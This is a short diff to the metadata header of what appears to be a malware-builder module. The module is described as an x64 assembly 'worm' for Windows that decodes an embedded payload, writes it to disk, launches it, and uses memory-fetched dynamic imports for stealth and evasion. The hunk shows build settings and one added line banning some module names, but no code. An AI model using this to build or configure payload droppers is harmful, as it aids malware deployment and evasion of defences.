@@ -2,6 +2,7 @@
 #!types##worm
 #!info##Assembler worm [W] [x64]. A lightweight worm written entirely in Assembly, making it extremely small and efficient. Upon execution, it decodes a payload, writes it to disk, and launches it using either WinExec or OpenProcessA. It supports embedding any type of payload, with a special variable allowing the creation of a custom execution command. Falcon uses dynamic imports fetched directly from memory, enhancing stealth and evasion capabilities
 #!system_FLAG##[W]
+#!banned##module##starter##shadow##junk
 #!globalVar##COMPILER##mingw-x64##Compiler name
 #!globalVar##OS_EXEC##win##Target system executable
 #!globalVar##NO_DLL##True##Not include DLLs
